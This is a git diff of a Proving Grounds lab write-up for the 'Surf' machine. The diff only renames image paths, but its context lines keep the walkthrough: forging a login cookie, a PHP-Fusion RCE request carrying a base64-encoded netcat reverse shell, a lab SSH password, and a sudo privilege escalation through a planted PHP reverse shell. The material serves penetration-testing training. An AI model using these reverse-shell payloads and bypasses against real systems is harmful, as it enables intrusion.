@@ -60,45 +60,45 @@ OS and Service detection performed. Please report any incorrect results at https
 
 After browsing for a while, the website looks nothing interesting. We use feroxbuster to discover new content.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h00m37s_001_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h00m37s_001_.png)
 
 We find a administration directory that is a login page. Using hydra with username ```admin``` to try to brute force a valid credential but failed.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h01m56s_002_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h01m56s_002_.png)
 
 I use Burp Sutie for further analysis. There is an interesting setting in login page.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h02m39s_003_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h02m39s_003_.png)
 
 We decode auth_status base64 string and get a string ```{'success':'false'}```. 
 
-![iamge](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h03m30s_004_.png)
+![iamge](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h03m30s_004_.png)
 
 Trying to modify it to bypass the login verification.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_13h15m30s_005_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_13h15m30s_005_.png)
 
 We log in successfully.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_13h19m42s_006_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_13h19m42s_006_.png)
 
 The ```Check Server Status``` page can check that the server where is installed PHP-Fusion is correctly running.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_14h00m22s_007_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_14h00m22s_007_.png)
 
 I found an RCE [vulnerability](https://www.exploit-db.com/exploits/49911) related to PHP-Fusion. Refer to the vulnerability description we create a new request payload to try to get the reverse shell.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_14h28m33s_008_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_14h28m33s_008_.png)
 
 Encoding the connection string to base64 format and make sure to add spaces to avoid ```+``` or ```=```.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_15h49m48s_009_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_15h49m48s_009_.png)
 
 ```
 echo "nc -e /bin/bash 192.168.49.162 80  " | base64
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h07m15s_010_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h07m15s_010_.png)
 
 We now combine request and base64 strings and modify the request url in Burp Suite.
 
@@ -106,29 +106,29 @@ We now combine request and base64 strings and modify the request url in Burp Sui
 http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_decode(bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTYyIDgwICAK))}
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h22m10s_011_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h22m10s_011_.png)
 
 Sending the request to the server and get the shell successfully.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)
 
 #### Privilege Escalation
 
 After searching for a while, I find there is a file in ```/var/www/server/administration/config/config.php``` includes the password.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h55m46s_013_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h55m46s_013_.png)
 
 We use the username ```james``` and password ```FlyToTheMoon213!``` to log in via ssh.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h57m01s_014_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h57m01s_014_.png)
 
 Running the linpeas script and find james can run follow command as root.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h02m58s_015_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h02m58s_015_.png)
 
 We have to check the file permission.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h05m35s_016_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h05m35s_016_.png)
 
 Because user ```www-data``` can modify file. We reconnect to www-data session shell and change the codes. 
 
@@ -136,7 +136,7 @@ Because user ```www-data``` can modify file. We reconnect to www-data session sh
 echo "<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>" >  /var/backups/database-backup.php
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h31m28s_017_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h31m28s_017_.png)
 
 Executing the php file with sudo in ```james``` session shell.
 
@@ -144,6 +144,6 @@ Executing the php file with sudo in ```james``` session shell.
 sudo /usr/bin/php /var/backups/database-backup.php
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h31m55s_018_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h31m55s_018_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h32m21s_019_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h32m21s_019_.png)
